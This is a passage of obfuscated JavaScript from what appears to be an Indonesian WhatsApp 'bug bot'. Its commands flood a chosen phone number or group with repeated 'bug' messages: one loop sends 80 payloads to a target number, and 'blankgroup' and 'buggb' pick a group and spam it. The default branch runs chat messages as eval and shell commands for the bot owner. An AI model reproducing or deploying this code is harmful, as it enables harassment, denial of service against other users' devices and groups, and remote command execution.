            return _0x4cca1e.reply("No Target Mana?\nExample: " + (_0x59a112 + _0x44eeee) + " 62×××");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x50422f(target, _0x51cce1);
          await _0x3834bd(target, _0x4cca1e, _0x51cce1);
          for (let _0x501305 = 0x0; _0x501305 < 0x14; _0x501305++) {
            await _0x57dfc3(target);
            await _0x57dfc3(target);
            await _0x57dfc3(target);
            await _0x57dfc3(target);
          }
        }
        break;
      case 'blankgroup':
        {
          if (!_0x545fcd && !_0x1ad0af) {
            return _0x1bd3dc("your what in own?");
          }
          let _0x5604b8 = _0x632862[0x0];
          if (!_0x5604b8) {
            return _0x4cca1e.reply("⚠️ *Silakan pilih grup dari menu!*");
          }
          try {
            for (let _0x5e211f = 0x0; _0x5e211f < 0x14; _0x5e211f++) {
              await _0x33e122(_0x5604b8);
              await _0x33e122(_0x5604b8);
              await _0x33e122(_0x5604b8);
            }
            _0x4cca1e.reply("✅ *Bug Group* berhasil dijalankan pada grup *" + _0x5604b8 + '*');
          } catch (_0x2b83cc) {
            _0x4cca1e.reply("❌ Gagal menjalankan Bug Group! Pastikan bot ada di grup tersebut.");
          }
          break;
        }
      case "buggb":
        {
          await _0x51cce1.sendMessage(_0x4cca1e.chat, {
            'react': {
              'text': '⏳',
              'key': _0x4cca1e.key
            }
          });
          let _0x3d8b96 = await _0x51cce1.groupFetchAllParticipating();
          let _0x39d5fa = Object.values(_0x3d8b96);
          if (_0x39d5fa.length === 0x0) {
            return _0x4cca1e.reply("⚠️ Bot tidak memiliki grup yang bisa dipilih.");
          }
          let _0x5dc7b4 = _0x39d5fa.map(_0x1e195c => ({
            'title': _0x1e195c.subject + " (" + _0x1e195c.participants.length + " Anggota)",
            'id': ".blankgroup " + _0x1e195c.id
          }));
          const _0x32196b = {
            'image': {
              'url': 'https://files.catbox.moe/6ac3wa.jpeg'
            },
            'caption': "📢 Pilih grup yang ingin kamu bug melalui tombol di bawah!",
            'footer': '',
            'headerType': 0x4,
            'viewOnce': true,
            'buttons': [{
              'buttonId': "selectgroup",
              'buttonText': {
                'displayText': "Pilih Grup"
              },
              'type': 0x4,
              'nativeFlowInfo': {
                'name': "single_select",
                'paramsJson': JSON.stringify({
                  'title': "Daftar Grup",
                  'sections': [{
                    'title': "Grup yang Tersedia",
                    'rows': _0x5dc7b4
                  }]
                })
              }
            }, {
              'buttonId': ".credits",
              'buttonText': {
                'displayText': '✦'
              },
              'type': 0x1
            }]
          };
          await _0x51cce1.sendMessage(_0x4cca1e.chat, {
            'react': {
              'text': '✅',
              'key': _0x4cca1e.key
            }
          });
          await _0x51cce1.sendMessage(_0x4cca1e.chat, _0x32196b, {
            'quoted': _0x361743
          });
          break;
        }
      default:
        if (_0x420994.startsWith('<')) {
          if (!_0x1ad0af) {
            return;
          }
          try {
            _0x4cca1e.reply(util.format(eval("(async () => { return " + _0x420994.slice(0x3) + " })()")));
          } catch (_0x58dca3) {
            _0x4cca1e.reply(String(_0x58dca3));
          }
        }
        if (_0x420994.startsWith('>')) {
          if (!_0x1ad0af) {
            return;
          }
          try {
            let _0x3da71c = await eval(_0x420994.slice(0x2));
            if (typeof _0x3da71c !== "string") {
              _0x3da71c = require('util').inspect(_0x3da71c);
            }
            await _0x4cca1e.reply(_0x3da71c);
          } catch (_0x2e3666) {
            await _0x4cca1e.reply(String(_0x2e3666));
          }
        }
        if (_0x420994.startsWith('$')) {
          if (!_0x1ad0af) {
            return;
          }
          require('child_process').exec(_0x420994.slice(0x2), (_0x330b21, _0x4cfcc9) => {
            if (_0x330b21) {
              return _0x4cca1e.reply('' + _0x330b21);
            }
            if (_0x4cfcc9) {
              return _0x4cca1e.reply(_0x4cfcc9);
            }
          });
        }
    }
  } catch (_0x4c0c54) {
    console.log(require("util").format(_0x4c0c54));
  }
};
let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log("[0;32m" + __filename + " [1;32mupdated![0m");
  delete require.cache[file];
  require(file);
});